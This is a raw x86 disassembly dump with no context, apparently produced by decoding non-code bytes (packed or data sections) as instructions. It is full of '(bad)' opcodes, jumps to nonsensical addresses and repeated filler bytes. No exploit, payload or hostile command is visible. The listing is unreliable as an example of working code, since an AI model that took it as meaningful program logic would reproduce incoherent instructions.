  40be22:	rol    BYTE PTR [edx],0x43
  40be25:	int3   
  40be26:	ret    0xbf45
  40be29:	int    0xb8
  40be2b:	retf   0x51d7
  40be2e:	and    al,0xd5
  40be30:	je     0x40bdd3
  40be32:	out    0x0,al
	...
  40be3c:	add    BYTE PTR [eax],al
  40be3e:	add    eax,0x9752d
  40be43:	add    BYTE PTR [esi-0x17582a20],ah
  40be49:	mov    bh,0xb7
  40be4b:	je     0x40be62
  40be4d:	mov    bl,0x8a
  40be4f:	fwait
  40be50:	or     edi,ebp
  40be52:	das    
  40be53:	jae    0x40beab
  40be55:	mov    WORD PTR [ebp+0x4d0691eb],ds
  40be5b:	mov    ds:0x3323ac10,al
  40be60:	jbe    0x40be69
  40be62:	mov    ch,BYTE PTR [ecx+0x61]
  40be65:	push   ecx
  40be66:	sldt   WORD PTR [eax]
  40be69:	cmp    eax,0x5700008d
  40be6e:	leave  
  40be6f:	adc    BYTE PTR [eax],al
  40be71:	push   esp
  40be73:	adc    eax,0xe3462e89
  40be78:	repz out 0xea,eax
  40be7b:	xchg   ecx,eax
  40be7c:	and    DWORD PTR [ebx+0x5d8144eb],edx
  40be82:	mov    al,0x1b
  40be84:	loope  0x40bee6
  40be86:	fbstp  TBYTE PTR [ebx]
  40be88:	push   ebx
  40be89:	lods   al,BYTE PTR ds:[esi]
  40be8a:	(bad)  
  40be8b:	(bad)  
  40be8c:	call   FWORD PTR ds:0x7353d9b7
  40be92:	push   ecx
  40be93:	sub    edx,DWORD PTR [edi+0x5151fe7b]
  40be99:	sub    bh,BYTE PTR [edi-0x2b]
  40be9c:	or     al,0x77
  40be9e:	sub    edx,esp
  40bea0:	scas   al,BYTE PTR es:[edi]
  40bea1:	and    ah,dl
  40bea3:	push   esi
  40bea4:	or     esp,DWORD PTR [ebx]
  40bea6:	ds (bad) 
  40bea8:	popf   
  40bea9:	sar    edi,cl
  40beab:	call   DWORD PTR [edx-0x24]
  40beae:	pop    ss
  40beaf:	(bad)  
  40beb0:	(bad)  
  40beb1:	dec    DWORD PTR [ebx-0x74747475]
  40beb7:	mov    ecx,DWORD PTR [ebx-0x746a7475]
  40bebd:	bound  eax,QWORD PTR [eax]
	...
  40bec7:	mov    ecx,DWORD PTR [ebx+0x12f2755b]
  40becd:	pop    DWORD PTR [edi+0x55]
  40bed0:	jno    0x40bed9
  40bed2:	loope  0x40be5a
  40bed4:	sub    al,0x5f
  40bed6:	rcl    bh,1
  40bed8:	pop    es
  40bed9:	fs dec ebx
  40bedb:	cli    
  40bedc:	call   0xb093f2ea
  40bee1:	mov    ecx,DWORD PTR [ebx-0x74741cb3]
  40bee7:	cwde   
  40bee8:	mov    edi,0x58768b8b
  40beed:	inc    esi
  40beee:	bound  ecx,QWORD PTR [ebp-0x34ca0fe6]
  40bef4:	leave  
  40bef5:	clc    
  40bef6:	js     0x40befe
  40bef8:	sub    ebx,esp
  40befa:	inc    edx
  40befb:	into   
  40befc:	push   cs
  40befd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40befe:	inc    eax
  40beff:	out    0xfc,eax
  40bf01:	inc    edx
  40bf02:	fisttp DWORD PTR [ebx-0x22c63c75]
  40bf08:	inc    ebx
  40bf09:	mov    ecx,DWORD PTR [ebx+0x7d79838b]
  40bf0f:	and    eax,0x1fe44a20
  40bf14:	outs   dx,BYTE PTR ds:[esi]
  40bf15:	mov    cl,0x72
  40bf17:	inc    edi
  40bf18:	inc    esp
  40bf19:	jnp    0x40bf43
  40bf1b:	scas   eax,DWORD PTR es:[edi]
  40bf1c:	jg     0x40bf97
  40bf1e:	sbb    ch,ch
  40bf20:	cmp    al,0x7
  40bf22:	ds (bad) 
  40bf24:	xchg   esi,eax
  40bf25:	pop    ss
  40bf26:	pop    es
  40bf27:	adc    BYTE PTR [eax],dl
  40bf29:	jl     0x40beab
  40bf2b:	lods   eax,DWORD PTR ds:[esi]
  40bf2c:	(bad)  [ecx-0x6a74745d]
  40bf32:	jmp    0xe8e8:0xe88b8b8b
  40bf39:	call   0xe929a826
  40bf3e:	call   0x252ea7d5
  40bf43:	and    al,0x24
  40bf45:	and    al,0x24
  40bf47:	and    al,0x24
  40bf49:	and    al,0x24
  40bf4b:	mov    ecx,DWORD PTR [ebx-0x56963903]
  40bf51:	add    eax,0xc7032c5d
  40bf56:	push   ebp
  40bf57:	sbb    DWORD PTR ds:0xa6f68294,0xffffffc2
  40bf5e:	cmp    bl,BYTE PTR [esi]
  40bf60:	add    BYTE PTR [esi-0x14],0xdf
  40bf64:	mov    al,ds:0xfe2a8b8b
  40bf69:	loopne 0x40bf19
  40bf6b:	pop    edi
  40bf6c:	jnp    0x40bf9f
  40bf6e:	and    edx,DWORD PTR [eax]
  40bf70:	mov    ah,ch
  40bf72:	xor    BYTE PTR [ebx],ch
  40bf74:	sub    al,0xf9
  40bf76:	je     0x40bfc2
  40bf78:	jp     0x40bff8
  40bf7a:	(bad)  
  40bf7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf7c:	mov    ds:0xc814eff2,eax
  40bf81:	fist   WORD PTR [ebx-0x15747461]
  40bf87:	or     dh,BYTE PTR [ebx-0x703f7475]
  40bf8d:	jnp    0x40947b
  40bf93:	pop    ss
  40bf94:	hlt    
  40bf95:	jns    0x40bf96
  40bf97:	or     eax,esp
  40bf99:	(bad)
  40bf9d:	dec    ebp
  40bf9e:	fnstenv [ebx-0x3a]
  40bfa1:	dec    edx
  40bfa2:	les    eax,FWORD PTR [edx+ebx*1-0x17a48f57]
  40bfa9:	call   0xe8b77596
  40bfae:	call   0xe92932ce
  40bfb3:	call   0x83c4433b
  40bfb8:	add    DWORD PTR [ebx+0x36838383],0x65
  40bfbf:	mov    esi,0x6d12a8ce
  40bfc4:	inc    ecx
  40bfc5:	jns    0x40bfd9
  40bfc7:	(bad)  
  40bfc8:	imul   eax,DWORD PTR [ecx-0x82c7df],0xbf39c950
  40bfd2:	push   ss
  40bfd3:	das    
  40bfd4:	jbe    0x40bfd5
  40bfd6:	(bad)  
  40bfd7:	(bad)  
  40bfd8:	(bad)  
  40bfd9:	(bad)  
  40bfda:	(bad)  
  40bfdb:	(bad)  
  40bfdc:	(bad)  
  40bfdd:	inc    DWORD PTR [eax]
  40bfdf:	add    dl,ch
  40bfe1:	nop
  40bfe2:	ret    
  40bfe3:	cli    
  40bfe4:	add    BYTE PTR [eax],al
  40bfe6:	push   edx
  40bfe7:	mov    ah,0x4c
  40bfe9:	dec    ebx
  40bfea:	outs   dx,DWORD PTR ds:[esi]
  40bfeb:	(bad)  
  40bfec:	div    DWORD PTR [esi+esi*2+0x7b]
  40bff0:	sbb    DWORD PTR [ebp+0x5a],0xf4e181a
  40bff7:	push   0x4c29dfba
  40bffc:	(bad)  
  40bffd:	dec    esi
  40bffe:	push   DWORD PTR ds:0x623cce18
  40c004:	and    BYTE PTR [esi],bh
  40c006:	imul   esp,DWORD PTR [ebx+0x70],0x2070660a
  40c00d:	jae    0x40c07d
  40c00f:	jae    0x40c07a
  40c011:	outs   dx,DWORD PTR ds:[esi]
  40c012:	ins    DWORD PTR es:[edi],dx
  40c013:	jae    0x40c07a
  40c015:	push   0x6e657343
  40c01a:	popa   
  40c01b:	jb     0x40c096
  40c01d:	or     dh,BYTE PTR [edx+0x2e]
  40c020:	popa   
  40c021:	ins    DWORD PTR es:[edi],dx
  40c022:	gs inc ebx
  40c024:	outs   dx,BYTE PTR ds:[esi]
  40c025:	imul   edx,DWORD PTR [edi+0x61],0x4c2e6d6c
  40c02c:	and    BYTE PTR [edx+0x6e],dh
  40c02f:	ins    DWORD PTR es:[edi],dx
  40c030:	push   ebx
  40c031:	jae    0x40c09c
  40c033:	addr16 jae 0x40c040
  40c036:	jae    0x40c0a6
  40c038:	push   edi
  40c039:	jo     0x40c0ad
  40c03b:	ins    DWORD PTR es:[edi],dx
  40c03c:	outs   dx,DWORD PTR ds:[esi]
  40c03d:	jae    0x40c0ad
  40c03f:	ds addr16 cmp al,0x20
  40c043:	and    BYTE PTR [eax],ah
  40c045:	outs   dx,BYTE PTR ds:[esi]
  40c046:	outs   dx,DWORD PTR ds:[esi]
  40c047:	inc    esp
  40c048:	jae    0x40c0a2
  40c04a:	cmp    BYTE PTR ds:0xd8df2237,bl
  40c050:	add    BYTE PTR [eax],al
  40c052:	inc    ebp
  40c053:	mov    dl,0x0
  40c055:	add    BYTE PTR [eax-0x29],bh
  40c058:	outs   dx,DWORD PTR ds:[esi]
  40c059:	add    BYTE PTR [eax+0x4b],dl
  40c05c:	pop    ds
  40c05d:	xchg   BYTE PTR [edx-0x7c76a209],bl
  40c063:	or     BYTE PTR [ebp+0x37],dl
  40c066:	stc    
  40c067:	adc    DWORD PTR [ebx-0x43],0xf1672c6b
  40c06e:	arpl   WORD PTR [ecx+0x50a6a187],ax
  40c074:	push   eax
  40c075:	push   eax
  40c076:	xchg   edi,eax
  40c077:	cs jp  0x40c0ca
  40c07a:	test   BYTE PTR [eax-0x65d6f3f],dh
  40c080:	mov    esi,0xb39f9d54
  40c085:	iret   
  40c086:	imul   edi,DWORD PTR [edi+0x3b],0x3259d5f2
  40c08d:	arpl   WORD PTR [ebp+0x42],sp
  40c090:	mov    esi,0x5050a8a1
  40c095:	sbb    DWORD PTR [esi],esp
  40c097:	out    0x50,eax
  40c099:	push   eax
  40c09a:	push   eax
  40c09b:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40c0a1:	mov    ecx,DWORD PTR [ebx+0x5cb28f8b]
  40c0a7:	(bad)  
  40c0a8:	(bad)  
  40c0a9:	(bad)  
  40c0aa:	(bad)  
  40c0ab:	(bad)  
  40c0ac:	(bad)  
  40c0ad:	(bad)  
  40c0ae:	(bad)  
  40c0af:	inc    DWORD PTR [ebp+0x45]
  40c0b2:	or     bl,BYTE PTR [ebx-0x36850325]
  40c0b8:	aad    0x44
  40c0ba:	jmp    0x2e61c20c
  40c0bf:	ret    
  40c0c0:	sub    al,0x6d
  40c0c2:	adc    eax,0xf6cf0456
  40c0c7:	pusha  
  40c0c8:	or     edx,esp
  40c0ca:	inc    ebp
  40c0cb:	inc    ebp
  40c0cc:	in     al,0x2d
  40c0ce:	inc    ebp
  40c0cf:	inc    ebp
  40c0d0:	dec    esi
  40c0d1:	sub    eax,DWORD PTR [ebp+0x45]
  40c0d4:	push   edi
  40c0d5:	mov    WORD PTR [edx+0x14],?
  40c0d8:	cld    
  40c0d9:	ficom  WORD PTR [ebx+esi*4-0x3ea84d5]
  40c0e0:	leave  
  40c0e1:	fstp   QWORD PTR [eax-0x74]
  40c0e4:	inc    eax
  40c0e5:	pop    edx
  40c0e6:	xchg   BYTE PTR [ecx-0x6a],bh
  40c0e9:	sub    ch,bh
  40c0eb:	fwait
  40c0ec:	inc    ebp
  40c0ed:	add    BYTE PTR [edx+ebx*2+0x6c],al
  40c0f1:	aam    0x0
  40c0f3:	add    BYTE PTR [eax],al
  40c0f5:	jns    0x40c134
  40c0f7:	xchg   ecx,eax
  40c0f8:	enter  0x946b,0x97
  40c0fc:	stc    
  40c0fd:	imul   ecx,eax,0x78
  40c100:	sbb    BYTE PTR [esp+ebp*8],al
  40c103:	cli    
  40c104:	mov    ebp,DWORD PTR [edi+0x7aa552f3]
  40c10a:	adc    esp,DWORD PTR gs:[esi-0xb8ee132]
  40c111:	jecxz  0x40c11d
  40c113:	mov    ebx,0x410e47a5
  40c118:	add    BYTE PTR [eax],al
  40c11a:	jl     0x40c14f
  40c11c:	add    BYTE PTR [eax],al
  40c11e:	add    bh,bh
  40c120:	(bad)  
  40c121:	(bad)  
  40c122:	(bad)  
  40c123:	(bad)  
  40c124:	(bad)  
  40c125:	(bad)  
  40c126:	(bad)  
  40c127:	inc    DWORD PTR [edx]
  40c129:	push   ss
  40c12a:	mov    ah,0x8d
  40c12c:	lea    ecx,[ebp-0x72727273]
  40c132:	lea    ecx,[ebp-0x70b00001]
  40c138:	sbb    dh,BYTE PTR [ebp-0x7f]
  40c13b:	out    dx,al
  40c13c:	mov    eax,ds:0xaee5823c
  40c141:	stos   BYTE PTR es:[edi],al
  40c142:	pop    eax
  40c143:	repz mov ds:0x97e16911,eax
  40c149:	leave  
  40c14a:	xchg   edx,eax
  40c14b:	xchg   esi,eax
  40c14c:	push   esp
  40c14d:	ins    BYTE PTR es:[edi],dx
  40c14e:	(bad)  
  40c14f:	push   DWORD PTR [edx-0x7e]
  40c152:	shl    dh,cl
  40c154:	mul    al
  40c156:	sbb    al,BYTE PTR [ecx]
  40c158:	fmul   DWORD PTR [esi-0x5aec0a87]
  40c15e:	adc    DWORD PTR [edi+0x74b5eef1],0xffffff83
  40c165:	loope  0x40c14f
  40c167:	div    BYTE PTR [eax-0x72314741]
  40c16d:	(bad)  
  40c16e:	call   DWORD PTR ds:0xfffff375
  40c174:	mov    dh,0xd2
  40c176:	fdivp  st(7),st
  40c178:	add    BYTE PTR [ebp-0x333cbd8d],dl
  40c17e:	xchg   edi,eax
  40c17f:	pop    ecx
  40c180:	push   ebp
  40c181:	mov    al,ds:0x919b5510
  40c186:	or     dh,ah
  40c188:	outs   dx,DWORD PTR ds:[esi]
  40c189:	bound  edx,QWORD PTR [eax*2-0x1f238e2c]
  40c190:	jge    0x40c192
  40c192:	add    BYTE PTR [eax],al
  40c194:	lds    edi,FWORD PTR ds:0x22c0000
	...
  40c1a6:	cdq    
  40c1a7:	mov    dh,0xe2
  40c1a9:	clc    
  40c1aa:	pusha  
  40c1ab:	push   ebx
  40c1ac:	outs   dx,DWORD PTR ds:[esi]
  40c1ad:	sbb    DWORD PTR [ebp-0x667db09f],ecx
  40c1b3:	xor    BYTE PTR [ebx-0x5c],0x1a
  40c1b7:	cld    
  40c1b8:	jmp    0x7519:0xe379ee43
  40c1bf:	jne    0x40c236
  40c1c1:	jne    0x40c238
  40c1c3:	jne    0x40c23a
  40c1c5:	jne    0x40c23c
  40c1c7:	jne    0x40c23e
  40c1c9:	stos   DWORD PTR es:[edi],eax
  40c1ca:	cmp    al,0xa0
  40c1cc:	pop    ecx
  40c1cd:	jne    0x40c244
  40c1cf:	adc    edx,DWORD PTR [eax]
  40c1d1:	jb     0x40c1c0
  40c1d3:	ror    BYTE PTR [esi+eiz*8],1
  40c1d6:	iret   
  40c1d7:	in     eax,0x75
  40c1d9:	fsub   QWORD PTR [esi]
  40c1db:	sub    esi,ebp
  40c1dd:	sub    BYTE PTR [edi],0xb4
  40c1e0:	call   0x5667:0x131c508b
  40c1e7:	ins    DWORD PTR es:[edi],dx
  40c1e8:	xchg   edx,eax
  40c1e9:	adc    eax,0x11ab4c2
  40c1ee:	xchg   DWORD PTR [ebx],ecx
  40c1f0:	or     ah,al
  40c1f2:	jne    0x40c269
  40c1f4:	outs   dx,DWORD PTR ds:[esi]
  40c1f5:	addr16 jne 0x40c26d
  40c1f8:	ins    BYTE PTR es:[edi],dx
  40c1f9:	imul   esp
  40c1fb:	jne    0x40c1fd
  40c1fd:	scas   eax,DWORD PTR es:[edi]
  40c1fe:	loopne 0x40c1e9
  40c200:	and    ebp,0xffffffea
  40c203:	mov    eax,0x2af0a5d2
  40c208:	arpl   WORD PTR [esi],si
  40c20a:	push   ss
  40c20b:	addr16 inc esi
  40c20d:	lahf   
  40c20e:	xchg   DWORD PTR [edx],ebx
  40c210:	mov    al,ch
  40c212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c213:	pop    ds
  40c214:	lods   al,BYTE PTR ds:[esi]
  40c215:	add    BYTE PTR [eax],al
  40c217:	add    BYTE PTR [ecx],cl
  40c219:	xor    dh,BYTE PTR [eax+0x4a9a15c3]
  40c21f:	cmp    eax,0x7aeafc0d
  40c224:	push   eax
  40c225:	jo     0x40c232
  40c227:	mov    bl,0x22
  40c229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c22a:	(bad)  
  40c22b:	push   edi
  40c22c:	out    dx,eax
  40c22d:	jle    0x40c291
  40c22f:	dec    esi
  40c230:	cld    
  40c231:	and    al,0x9b
  40c233:	mov    esi,0xd00004a
  40c238:	lea    ebp,[esi+0x0]
  40c23b:	add    BYTE PTR [eax],al
  40c23d:	inc    ebp
  40c23e:	inc    ebp
  40c23f:	inc    ebp
  40c240:	inc    ebp
  40c241:	inc    ebp
  40c242:	inc    ebp
  40c243:	inc    ebp
  40c244:	inc    ebp
  40c245:	inc    ebp
  40c246:	ja     0x40c28f
  40c248:	mov    ds:0x0,eax
  40c24d:	add    BYTE PTR [eax],al
  40c24f:	add    BYTE PTR [eax],al
  40c251:	cmp    ah,BYTE PTR [ebp+0x69]
  40c254:	cmp    al,0x62
  40c256:	je     0x40c2bd
  40c258:	js     0x40c2cd
  40c25a:	jo     0x40c2c9
  40c25c:	outs   dx,DWORD PTR ds:[esi]
  40c25d:	or     dh,BYTE PTR [edx+0x64]
  40c260:	arpl   WORD PTR [ebp+ebp*2+0x4d],ax
  40c264:	and    BYTE PTR [ebp+0xd],ch
  40c267:	cmp    al,0x57
  40c269:	je     0x40c2d8
  40c26b:	outs   dx,BYTE PTR ds:[esi]
  40c26c:	dec    ebp
  40c26d:	jb     0x40c2e5
  40c26f:	fs ds gs and BYTE PTR ds:[ebp+0xd],ch
  40c276:	jns    0x40c2e5
  40c278:	jae    0x40c2dc
  40c27a:	gs cs cmp eax,0x612e2263
  40c281:	jb     0x40c2f1
  40c283:	ins    BYTE PTR es:[edi],dx
  40c284:	jae    0x40c2e7
  40c286:	ins    DWORD PTR es:[edi],dx
  40c287:	and    BYTE PTR [ecx+0x73],ch
  40c28a:	jae    0x40c2bb
  40c28c:	or     ch,BYTE PTR [ecx+0xd]
  40c28f:	dec    ebp
  40c290:	dec    ebp
  40c291:	je     0x40c2f5
  40c293:	and    BYTE PTR gs:[eax],ah
  40c296:	jb     0x40c2fd
  40c298:	outs   dx,DWORD PTR ds:[esi]
  40c299:	inc    ebx
  40c29a:	and    BYTE PTR [ebp+0x53],ah
  40c29d:	push   0x6b706120
  40c2a2:	gs jb  0x40c314
  40c2a5:	jb     0x40c2b4
  40c2a7:	jae    0x40c2ea
  40c2a9:	ins    DWORD PTR es:[edi],dx
  40c2aa:	je     0x40c2b6
  40c2ac:	gs cmp al,0x72
  40c2af:	ins    DWORD PTR es:[edi],dx
  40c2b0:	and    BYTE PTR [edi+ebp*2+0x3a],dh
  40c2b4:	inc    ebx
  40c2b5:	jbe    0x40c2c1
  40c2b7:	das    
  40c2b8:	jae    0x40c328
  40c2ba:	jb     0x40c30e
  40c2bc:	ins    DWORD PTR es:[edi],dx
  40c2bd:	jb     0x40c2bf
  40c2bf:	add    BYTE PTR [eax],al
  40c2c1:	jg     0x40c2f7
  40c2c3:	dec    ebp
  40c2c4:	dec    esi
  40c2c5:	jnp    0x40c263
  40c2c7:	mov    esi,0x9f5c9da2
  40c2cc:	retf   0x1827
  40c2cf:	outs   dx,DWORD PTR ds:[esi]
  40c2d0:	lods   eax,DWORD PTR ds:[esi]
  40c2d1:	mov    ch,BYTE PTR [edx*4+0x552b85fa]
  40c2d8:	inc    ecx
  40c2d9:	add    BYTE PTR [eax],al
  40c2db:	scas   al,BYTE PTR es:[edi]
  40c2dc:	pop    ss
  40c2dd:	add    BYTE PTR [eax],al
  40c2df:	sub    esi,esp
  40c2e1:	add    BYTE PTR [eax],al
  40c2e3:	and    cl,BYTE PTR [esi]
  40c2e5:	adc    al,0x6d
  40c2e7:	ja     0x40c34f
  40c2e9:	mov    ch,0x5c
  40c2eb:	and    edi,DWORD PTR [edx-0x12]
  40c2ee:	jbe    0x40c33f
  40c2f0:	cmp    ah,BYTE PTR ss:[eax+0x0]
  40c2f4:	(bad)  
  40c2f6:	fiadd  WORD PTR [esi+edx*4]
  40c2f9:	aas    
  40c2fa:	std    
  40c2fb:	add    BYTE PTR [eax-0x54],dl
  40c2fe:	(bad)  
  40c2ff:	data16 not BYTE PTR [eax+0x50]
  40c303:	push   eax
  40c304:	mov    bl,0x42
  40c306:	imul   edx,esp,0xffffffd0
  40c309:	call   0x31c7a3cd
  40c30e:	stos   DWORD PTR es:[edi],eax
  40c30f:	cmp    edx,DWORD PTR [ecx]
  40c311:	cmp    edx,esp
  40c313:	bnd je 0x40c35e
  40c316:	in     al,dx
  40c317:	mov    al,ds:0x68a9d785
  40c31c:	fsubr  st(7),st
  40c31e:	pusha  
  40c31f:	addr16 out dx,eax
  40c321:	call   0xf0b173bb
  40c326:	ins    BYTE PTR es:[edi],dx
  40c327:	push   eax
  40c328:	push   eax
  40c329:	test   eax,0x5050504e
  40c32e:	(bad)  
  40c32f:	(bad)  
  40c330:	(bad)  
  40c331:	(bad)  
  40c332:	(bad)  
  40c333:	(bad)  
  40c334:	(bad)  
  40c335:	(bad)  
  40c336:	call   DWORD PTR [eax+0x7d]
  40c339:	dec    eax
	...
  40c342:	add    BYTE PTR [ebp-0x4162c473],cl
  40c348:	retf   
  40c349:	push   es
  40c34a:	fdivr  QWORD PTR [ebx+eax*1]
  40c34d:	xor    dl,bh
  40c34f:	outs   dx,BYTE PTR ds:[esi]
  40c350:	rcl    ebp,cl
  40c352:	pop    eax
  40c353:	retf   
  40c354:	sub    al,0x85
  40c356:	jl     0x40c366
  40c358:	pop    es
  40c359:	xor    eax,0x8d431963
  40c35e:	lea    esp,[edx]
  40c360:	inc    edi
  40c361:	add    dl,ah
  40c363:	loope  0x40c34f
  40c365:	ror    BYTE PTR [ecx+0x5c],cl
  40c368:	pop    ss
  40c369:	fist   DWORD PTR [eax]
  40c36b:	or     al,0xad
  40c36d:	fld    QWORD PTR [esi]
  40c36f:	aad    0x42
  40c371:	ret    0x91cd
  40c374:	push   ecx
  40c375:	enter  0xf603,0xf8
  40c379:	jl     0x40c3e3
  40c37b:	or     DWORD PTR [ebp+0x37fdcb8d],0x7948d8d
  40c385:	call   0x417a:0x598c248d
  40c38c:	or     edx,esi
  40c38e:	ror    DWORD PTR ds:0xd6c54f64,0x8f
  40c395:	push   esp
  40c396:	clc    
  40c397:	cmp    ecx,ecx
  40c399:	cwde   
  40c39a:	dec    edx
  40c39b:	fwait
  40c39c:	rcl    BYTE PTR [edi],1
  40c39e:	inc    edi
  40c39f:	cmp    BYTE PTR [esp],ah
  40c3a2:	and    al,0xdc
  40c3a4:	pop    ebx
  40c3a5:	and    al,0x24
  40c3a7:	mov    ds:0x24242401,eax
	...
  40c3b4:	add    BYTE PTR [ebx-0x6a89a8ed],ah
  40c3ba:	or     BYTE PTR [esi-0xd8fc5d3],0xa
  40c3c1:	sar    DWORD PTR [eax+0x18],0xbf
  40c3c5:	mov    eax,DWORD PTR [edx-0x3d]
  40c3c8:	dec    ebp
  40c3c9:	scas   eax,DWORD PTR es:[edi]
  40c3ca:	jge    0x40c364
  40c3cc:	stc    
  40c3cd:	(bad)  
  40c3ce:	(bad)  
  40c3cf:	(bad)  
  40c3d0:	(bad)  
  40c3d1:	(bad)  
  40c3d2:	(bad)  
  40c3d3:	(bad)  
  40c3d4:	(bad)  
  40c3d5:	(bad)  
  40c3d7:	add    al,0x2a
  40c3d9:	arpl   WORD PTR [ecx+0x14],cx
  40c3dc:	add    al,0x4
  40c3de:	mov    gs,ebx
  40c3e0:	lds    edx,FWORD PTR [ecx+0x72]
  40c3e3:	add    al,0x71
  40c3e5:	xchg   edi,eax
  40c3e6:	mov    ch,0xf0
  40c3e8:	pop    edi
  40c3e9:	iret   
  40c3ea:	adc    al,0xcb
  40c3ec:	es retf 
  40c3ee:	sub    al,0x23
  40c3f0:	inc    edx
  40c3f1:	xchg   ecx,eax
  40c3f2:	shr    ebp,cl
  40c3f4:	rcl    BYTE PTR es:[edi],0x23
  40c3f8:	stos   WORD PTR es:[edi],ax
  40c3fa:	sub    al,0xe7
  40c3fc:	mov    ch,0x42
  40c3fe:	test   eax,0x40433bb
  40c403:	mov    eax,ds:0x89040489
  40c408:	ins    BYTE PTR es:[edi],dx
  40c409:	lds    eax,FWORD PTR [ecx+ecx*4]
  40c40c:	fistp  DWORD PTR [eax]
  40c40e:	(bad)  
  40c410:	cwde   
  40c411:	push   0xffffffa9
  40c413:	pop    ds
  40c414:	aaa    
  40c415:	xchg   edx,eax
  40c416:	arpl   WORD PTR [edx+0x5907f538],bp
  40c41c:	cmp    eax,0x1344e438
  40c421:	cdq    
  40c422:	mov    ah,0xf
  40c424:	mov    DWORD PTR [ecx-0x44383777],ecx
  40c42a:	jns    0x40c42a
  40c42c:	push   ebx
  40c42d:	repnz daa 
  40c42f:	neg    DWORD PTR [ebx-0x6491c211]
  40c435:	addr16 addr16 imul ecx,ebp,0x5a696b47
  40c43d:	jae    0x40c46a
  40c43f:	es js  0x40c3ff
  40c442:	enter  0x89d3,0x89
  40c446:	ss adc al,0x6d
  40c449:	mov    DWORD PTR [ecx-0x72727277],ecx
  40c44f:	lea    ecx,[ebp-0x72727273]
  40c455:	arpl   si,bp
  40c457:	ror    esp,0xcc
  40c45a:	int3   
  40c45b:	int3   
  40c45c:	int3   
  40c45d:	int3   
  40c45e:	int3   
  40c45f:	int3   
  40c460:	int3   
  40c461:	call   0x93a2414e
  40c466:	or     ebx,edx
  40c468:	shr    edx,cl
  40c46a:	inc    edx
  40c46b:	dec    edi
  40c46c:	outs   dx,DWORD PTR ds:[esi]
  40c46d:	and    edx,DWORD PTR [ebx-0x41820d2b]
  40c473:	cld    
  40c474:	iret   
  40c475:	xchg   DWORD PTR [ebp+0xdcf76d9],ebp
  40c47b:	call   0xe8f3c368
  40c480:	call   0xe92952b9
  40c485:	push   esp
  40c486:	fistp  WORD PTR [ebp-0x4a09c963]
  40c48c:	arpl   bx,di
  40c48e:	ins    BYTE PTR es:[edi],dx
  40c48f:	rdpmc  
  40c491:	inc    esp
  40c492:	sahf   
  40c493:	pop    edx
  40c494:	sub    BYTE PTR [eax],al
  40c496:	push   ds
  40c497:	mov    ebp,0x2a19fd38
  40c49c:	cmp    al,ch
  40c49e:	add    BYTE PTR [ecx],bl
  40c4a0:	out    dx,eax
  40c4a1:	mov    dh,0x29
  40c4a3:	add    BYTE PTR [eax],al
  40c4a5:	add    BYTE PTR [esi-0x30e9e1dc],cl
  40c4ab:	fstp   DWORD PTR [ecx-0x62d3503c]
  40c4b1:	adc    al,0x58
  40c4b3:	inc    ebx
  40c4b4:	fcomi  st,st(0)
  40c4b7:	sbb    edx,DWORD PTR [ecx]
  40c4b9:	dec    edx
  40c4ba:	and    bl,bl
  40c4bc:	mov    al,0xaa
  40c4be:	mov    bl,0x2d
  40c4c0:	and    eax,0x4826230c
  40c4c5:	inc    edx
  40c4c6:	sub    edi,ebp
  40c4c8:	adc    al,0x0
  40c4ca:	add    BYTE PTR [esi],ah
  40c4cc:	xchg   ecx,eax
  40c4cd:	add    BYTE PTR [eax],al
  40c4cf:	add    BYTE PTR [ebp-0x72727273],cl
  40c4d5:	lea    ecx,[ebp+0x76618d8d]
  40c4db:	push   ss
  40c4dc:	(bad)  
  40c4dd:	(bad)  
  40c4de:	(bad)  
  40c4df:	(bad)  
  40c4e0:	(bad)  
  40c4e1:	(bad)  
  40c4e2:	(bad)  
  40c4e3:	(bad)  
  40c4e4:	inc    DWORD PTR [eax]
  40c4e6:	add    BYTE PTR [edx+0x4aa25a7f],ch
  40c4ec:	dec    esi
  40c4ed:	mov    ecx,0xec1e98a7
  40c4f2:	outs   dx,BYTE PTR ds:[esi]
  40c4f3:	dec    eax
  40c4f4:	jp     0x40c4fb
  40c4f6:	sub    eax,0x2c463c92
  40c4fb:	mov    ebx,0xa0bc49
  40c500:	add    ch,ah
  40c502:	ins    BYTE PTR es:[edi],dx
  40c503:	and    eax,0x41de5c39
  40c508:	ins    DWORD PTR es:[edi],dx
  40c509:	das    
  40c50a:	enter  0x92d7,0x55
  40c50e:	mov    al,0xd3
  40c510:	neg    BYTE PTR [ecx-0x60]
  40c513:	jno    0x40c56a
  40c515:	mov    esi,0xb35f4da1
  40c51a:	das    
  40c51b:	xor    DWORD PTR [edi-0xfffff5e],0x4a41
  40c525:	(bad)  
  40c526:	push   edx
  40c527:	add    eax,DWORD PTR [eax]
  40c529:	add    BYTE PTR [eax+eiz*4-0x50],dh
  40c52d:	dec    edi
  40c52e:	repz (bad) 
  40c530:	shr    BYTE PTR [edi+0x363fb212],0x37
  40c537:	pop    eax
  40c538:	loopne 0x40c54a
  40c53a:	mov    BYTE PTR [edx],bh
  40c53c:	mov    edi,0xa28e4ece
  40c541:	fiadd  DWORD PTR [eax]
  40c543:	add    BYTE PTR [eax],al
  40c545:	sbb    eax,0xf600003d
  40c54a:	mov    eax,0x74000000
  40c54f:	je     0x40c5c5
  40c551:	je     0x40c5c7
  40c553:	je     0x40c5c9
  40c555:	je     0x40c5cb
  40c557:	sbb    ebp,DWORD PTR [edi+0x76]
  40c55a:	pop    edx
  40c55b:	push   ebx
  40c55c:	or     ebp,ebp
  40c55e:	adc    al,0xc3
  40c560:	pop    edi
  40c561:	and    al,0x6e
  40c563:	inc    edx
  40c564:	dec    edx
  40c565:	xchg   al,ah
  40c567:	jge    0x40c5e3
  40c569:	sbb    esp,DWORD PTR [esi+0x29]
  40c56c:	sbb    DWORD PTR [ecx],ecx
  40c56e:	add    al,BYTE PTR [ebp-0x7a7a7a7b]
  40c574:	test   DWORD PTR [ebp-0x72727a7b],eax
  40c57a:	inc    esp
  40c57b:	in     al,0x71
  40c57d:	sbb    eax,0x774d8d8d
  40c582:	jae    0x40c603
  40c584:	mov    bh,0x3
  40c586:	test   DWORD PTR [edi+eiz*4+0x10fd0975],esp
  40c58d:	mov    eax,ds:0x3fe8dc2e
  40c592:	(bad)  
  40c593:	cmp    al,0x29
  40c595:	bound  edi,QWORD PTR [edx]
  40c597:	add    cl,BYTE PTR [eax-0x50]
